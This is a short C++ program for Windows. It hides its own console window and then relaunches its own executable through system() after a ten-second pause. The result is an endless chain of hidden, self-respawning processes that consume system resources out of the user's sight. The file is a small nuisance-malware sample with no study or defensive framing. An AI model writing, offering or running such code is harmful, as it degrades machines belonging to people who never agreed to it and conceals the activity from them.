#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
int main(int argv, char *argc[])
{
    cout << argc[0];
    sleep(10);
    HideConsole();
    system(argc[0]);
    return 0;
}